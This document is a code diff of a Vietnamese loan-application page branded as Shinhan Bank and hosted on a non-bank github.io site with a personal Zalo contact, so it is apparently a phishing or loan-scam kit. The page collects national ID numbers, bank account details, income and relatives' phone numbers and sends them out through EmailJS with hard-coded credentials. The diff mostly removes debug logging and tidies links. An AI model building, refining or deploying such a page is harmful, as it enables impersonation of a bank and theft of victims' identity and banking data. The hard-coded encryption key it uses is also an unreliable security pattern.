@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Ngân hàng Shinhan - Nhập thông tin</title>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="../../assets/js/router.js"></script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
@@ -334,7 +336,7 @@
             left: 0;
             width: 100%;
             background: #fff;
-            border: 1px solid #b3cde0;
+            border: 1px solid #cddde0;
             border-radius: 10px;
             max-height: 50vh;
             overflow-y: auto;
@@ -444,7 +446,7 @@
             <div class="dropdown">
                 <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Menu"></i>
                 <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="step1.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                     <li><a class="dropdown-item" href="https://zalo.me/84762797077">LIÊN HỆ</a></li>
                 </ul>
             </div>
@@ -454,13 +456,13 @@
     <div class="container">
         <ul class="nav-tabs">
             <li class="nav-item">
-                <a class="nav-link active" href="https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html">1. Nhập thông tin</a>
+                <a class="nav-link active" href="step1.html">1. Nhập thông tin</a>
             </li>
             <li class="nav-item">
-                <a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html">2. Xác thực và xử lý</a>
+                <a class="nav-link" href="step2.html">2. Xác thực và xử lý</a>
             </li>
             <li class="nav-item">
-                <a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html">3. Hoàn thành</a>
+                <a class="nav-link" href="step3.html">3. Hoàn thành</a>
             </li>
         </ul>
 
@@ -998,20 +1000,19 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS
         try {
             emailjs.init("c-Ms5MjWbitpDBb-E");
-            console.log('EmailJS initialized successfully');
         } catch (error) {
-            console.error('EmailJS initialization failed:', error);
             alert('Cannot initialize EmailJS. Please check connection or configuration.');
         }
 
         let userData = {};
         let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
 
+        // Check form validity to enable/disable submit button
         function checkFormValidity() {
             const requiredFields = [
                 'fullName', 'cccd', 'idIssueDate', 'contactAddress', 'phone', 'email',
@@ -1019,25 +1020,23 @@
                 'bankName', 'accountName', 'accountNumber', 'disbursementDate',
                 'relativePhone', 'relationship'
             ];
-            // Also check the privacy consent checkbox
             const privacyConsent = $('#privacyConsent').is(':checked');
 
             const allValid = requiredFields.every(id => {
                 const value = $(`#${id}`).val();
-                // For 'other' loan amount, check the custom input
                 if (id === 'loanAmount' && value === 'other') {
                     return $('#customLoanAmount').val()?.trim() !== '';
                 }
                 return value && value.trim() !== '';
             });
 
-            // The button should be enabled only if all fields are valid AND the consent checkbox is checked
             $('#submitButton').prop('disabled', !(allValid && privacyConsent));
         }
 
         $(document).ready(function() {
             $('[data-bs-toggle="tooltip"]').tooltip();
 
+            // Format and validate phone numbers
             function formatPhoneNumber(input) {
                 let value = input.value.trim().replace(/\s/g, '');
                 if (value.startsWith('+84')) value = '0' + value.slice(3);
@@ -1050,7 +1049,6 @@
 
             $('#phone, #relativePhone').on('input', function() {
                 formatPhoneNumber(this);
-                // Real-time validation for phone
                 const errorElement = $(`#${this.id}Error`);
                 const parent = $(this).closest('.form-group');
                 if (!/^0[1-9]\d{8}$/.test(this.value.replace(/\s/g, ''))) {
@@ -1065,6 +1063,7 @@
                 placeholder: "0_________"
             });
 
+            // Validate CCCD
             $('#cccd').on('input', function() {
                 const value = $(this).val().trim();
                 const errorElement = $('#cccdError');
@@ -1109,21 +1108,21 @@
                 }
             });
             
-            // Add event listeners to check form validity on every input/change
             $('#registrationForm input, #registrationForm select').on('input change', function() {
                 debounceSave();
                 checkFormValidity();
             });
 
-            checkFormValidity(); // Initial check on page load
+            checkFormValidity();
         });
 
+        // Handle bank logo image errors
         function handleImageError(img, bankName) {
-            console.warn(`Failed to load logo for ${bankName}: ${img.src}`);
             img.src = 'https://via.placeholder.com/30?text=Ngân hàng';
             img.alt = `Logo ${bankName}`;
         }
 
+        // Initialize custom bank select dropdown
         function initCustomBankSelect() {
             const bankSelect = $('#bank-select');
             const bankToggle = bankSelect.find('.custom-select-toggle');
@@ -1152,7 +1151,7 @@
                         const text = $(this).text().trim();
                         const imgSrc = $(this).find('img').attr('src');
                         bankToggle.html(`<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`);
-                        bankInput.val(value).trigger('change'); // Trigger change for validity check
+                        bankInput.val(value).trigger('change');
                         bankList.removeClass('show');
                         bankToggle.attr('aria-expanded', 'false');
                         bankSelect.removeClass('is-invalid');
@@ -1169,6 +1168,7 @@
             });
         }
 
+        // Update interest rate based on loan type
         function updateInterestRate() {
             const loanType = $('#loanType').val() || userData.loanType || '';
             const interestRate = $('#interestRate');
@@ -1182,7 +1182,6 @@
             };
             const rate = rates[loanType] || 7.0;
             interestRate.val(rate.toFixed(2));
-            console.log(`Lãi suất: ${rate}% cho ${loanType || 'mặc định'}`);
             interestRate.trigger('change');
         }
 
@@ -1192,6 +1191,7 @@
             $(this).val(parseFloat($(this).val()).toFixed(2));
         });
 
+        // Get current date in YYYY-MM-DD format
         function getCurrentDate() {
             const today = new Date();
             const year = today.getFullYear();
@@ -1200,6 +1200,7 @@
             return `${year}-${month}-${day}`;
         }
 
+        // Check localStorage availability
         function checkLocalStorageQuota() {
             try {
                 if (!window.localStorage) throw new Error('localStorage not available');
@@ -1208,33 +1209,31 @@
                 localStorage.removeItem(testKey);
                 return true;
             } catch (e) {
-                console.error('Local storage error:', e);
                 alert('Cannot access localStorage. Please check browser settings.');
                 return false;
             }
         }
 
+        // Save user data to localStorage
         function saveToLocalStorage() {
             if (!checkLocalStorageQuota()) return false;
             try {
                 const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                 localStorage.setItem('userData', encryptedData);
-                // console.log('Saved userData to localStorage:', userData); // Optional: uncomment for debugging
                 return true;
             } catch (error) {
-                console.error('Error saving userData to localStorage:', error);
                 alert('Error saving data. Please check or contact support.');
                 return false;
             }
         }
 
+        // Load user data from localStorage
         function loadUserData() {
             if (!checkLocalStorageQuota()) return;
             try {
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
-                    console.log('Loaded userData from localStorage:', userData);
                     $('#fullName').val(userData.fullName || '');
                     $('#dob').val(userData.dob || '');
                     $('#gender').val(userData.gender || '');
@@ -1273,16 +1272,17 @@
                     updateInterestRate();
                 }
             } catch (error) {
-                console.error('Error loading userData from localStorage:', error);
                 updateInterestRate();
             }
         }
 
+        // Validate date format and logic
         function isValidDate(day, month, year) {
             const date = new Date(year, month - 1, day);
             return date.getDate() === day && date.getMonth() + 1 === month && date.getFullYear() === year;
         }
 
+        // Validate form inputs
         function validateForm() {
             let isValid = true;
             let firstErrorElement = null;
@@ -1371,18 +1371,17 @@
                 }
             });
 
-            // Kiểm tra trùng CCCD
+            // Check for duplicate CCCD
             const cccdValue = $('#cccd').val().trim();
             if (isValid && cccdValue && registeredUsers.includes(cccdValue)) {
                 const duplicateMessage = 'CCCD đã được đăng ký.';
-                console.error('Duplicate CCCD detected:', cccdValue);
                 $('#cccdError').text(duplicateMessage).css({ 'display': 'block' });
                 $('#cccd').closest('.form-group').addClass('is-invalid');
                 if (!firstErrorElement) firstErrorElement = $('#cccd')[0];
                 isValid = false;
             }
 
-            // Kiểm tra số điện thoại người thân
+            // Check relative phone against personal phone
             const personalPhone = $('#phone').val().replace(/\s/g, '');
             const relativePhone = $('#relativePhone').val().replace(/\s/g, '');
             if (isValid && personalPhone && relativePhone && personalPhone === relativePhone) {
@@ -1400,26 +1399,25 @@
             return isValid;
         }
 
+        // Calculate loan details
         function calculateLoan() {
-            console.log('Calculating loan');
-            // Use a less strict validation for calculation
             const loanAmountEl = $('#loanAmount');
             const loanTermEl = $('#loanTerm');
             const interestRateEl = $('#interestRate');
             let isCalcValid = true;
-            if(!loanAmountEl.val() || (loanAmountEl.val() === 'other' && !$('#customLoanAmount').val())) {
+
+            if (!loanAmountEl.val() || (loanAmountEl.val() === 'other' && !$('#customLoanAmount').val())) {
                 loanAmountEl.closest('.form-group').addClass('is-invalid');
                 $('#loanAmountError').text('Vui lòng chọn hoặc nhập số tiền vay.').show();
                 isCalcValid = false;
             }
-             if(!loanTermEl.val()) {
+            if (!loanTermEl.val()) {
                 loanTermEl.closest('.form-group').addClass('is-invalid');
                 $('#loanTermError').text('Vui lòng chọn thời hạn vay.').show();
                 isCalcValid = false;
             }
-            if(!isCalcValid) {
-                 console.log('Calculation validation failed');
-                 return;
+            if (!isCalcValid) {
+                return;
             }
 
             const spinner = $('.spinner-calculate');
@@ -1441,7 +1439,6 @@
                 const interestRate = parseFloat($('#interestRate').val()) / 100 / 12;
 
                 if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate)) {
-                    console.error('Invalid inputs for calculation:', { loanAmount, loanTerm, interestRate });
                     spinner.hide();
                     return;
                 }
@@ -1481,10 +1478,10 @@
 
                 spinner.hide();
                 successMessage.show();
-                console.log('Calculation completed');
             }, 1000);
         }
-        
+
+        // Debounce function for real-time saving
         function debounce(func, wait) {
             let timeout;
             return function(...args) {
@@ -1493,6 +1490,7 @@
             };
         }
 
+        // Save form data in real-time
         function saveFormDataRealTime() {
             const loanAmountValue = $('#loanAmount').val();
             const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
@@ -1533,11 +1531,10 @@
 
         const debounceSave = debounce(saveFormDataRealTime, 300);
 
+        // Handle form submission
         async function handleSubmit(event) {
             event.preventDefault();
-            console.log('Form submission triggered');
             if (!validateForm()) {
-                console.log('Validation failed, stopping submission');
                 return;
             }
 
@@ -1545,7 +1542,7 @@
             spinner.show();
             $('#submitButton').prop('disabled', true);
 
-            // Gather data again, ensuring no empty fields are sent
+            // Gather form data
             const loanAmountValue = $('#loanAmount').val();
             const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
             userData = {
@@ -1582,13 +1579,9 @@
                 emailSent: false
             };
 
-            // Log data for debugging
-            console.log('User data before sending email:', JSON.stringify(userData, null, 2));
-
             if (!saveToLocalStorage()) {
-                console.error('LocalStorage save failed');
                 spinner.hide();
-                $('#submitButton').prop('disabled', false); // Re-enable on failure
+                $('#submitButton').prop('disabled', false);
                 return;
             }
 
@@ -1596,7 +1589,7 @@
             localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
             localStorage.setItem('isRegistered', 'true');
 
-            // Correct mapping for EmailJS template
+            // Prepare EmailJS template parameters
             const templateParams = {
                 full_name: userData.fullName,
                 dob: userData.dob,
@@ -1616,8 +1609,8 @@
                 income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VNĐ' : '',
                 occupation: userData.occupation,
                 loan_purpose: userData.loanPurpose,
-                company_phone: userData.relativePhone, // Correct mapping
-                company_address: userData.relationship, // Correct mapping
+                company_phone: userData.relativePhone,
+                company_address: userData.relationship,
                 account_holder_name: userData.accountName,
                 account_number: userData.accountNumber,
                 bank_name: userData.bankName,
@@ -1627,21 +1620,18 @@
                 total_repayment: userData.totalRepay ? Math.floor(userData.totalRepay).toLocaleString('vi-VN') + ' VNĐ' : ''
             };
 
-            // Send email
+            // Send email via EmailJS
             try {
                 if (!emailjs) throw new Error('EmailJS not initialized');
                 const response = await emailjs.send('service_60tgxof', 'template_op886wg', templateParams);
-                console.log('Email sent:', response.status, response.text);
                 userData.emailSent = true;
                 saveToLocalStorage();
                 spinner.hide();
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+                window.location.href = 'step2.html';
             } catch (error) {
-                console.error('Email send failed:', error);
-                // Optional: add a user-facing error message here
                 alert('Gửi đăng ký không thành công. Vui lòng thử lại sau.');
                 spinner.hide();
-                $('#submitButton').prop('disabled', false); // Re-enable button on failure
+                $('#submitButton').prop('disabled', false);
             }
         }
 
